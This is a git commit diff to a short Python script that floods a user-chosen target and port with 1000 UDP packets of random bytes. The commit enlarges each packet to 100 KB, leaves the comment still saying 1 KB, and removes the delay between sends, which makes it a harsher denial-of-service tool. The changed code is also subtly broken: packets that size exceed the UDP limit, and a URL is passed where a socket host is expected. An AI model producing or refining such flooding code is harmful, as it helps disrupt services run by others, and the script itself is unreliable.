ef9d07dce4ee2de9646ddf581be9e466e115898c
dhungx <139793488+dhungx@users.noreply.github.com>
2024-08-16 21:00:16 +0700

    Update main.py

--- main.py
+++ main.py
@@ -4,20 +4,19 @@ import time
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-ip = input("Enter Target IP: ")
+url = input("Enter Target URL: ")
 port = int(input("Enter Target Port: "))
 
 # Địa chỉ và cổng đích
-target_address = (ip, port)
+target_address = (url, port)
 
 # Số lượng vòng lặp thực tế hơn
 num_messages = 1000
-chunk_size = 1024  # Kích thước của mỗi gói tin (1 KB)
+chunk_size = 1024 * 100  # Kích thước của mỗi gói tin (1 KB)
 
 for i in range(num_messages):
     data = random._urandom(chunk_size)
     s.sendto(data, target_address)
-    print(f"Sent: {i + 1}", end='\r')
-    time.sleep(0.1)  # Thay vì `sleep`, sử dụng `time.sleep`
+    print(f"Sent: {i}")
 
 s.close()
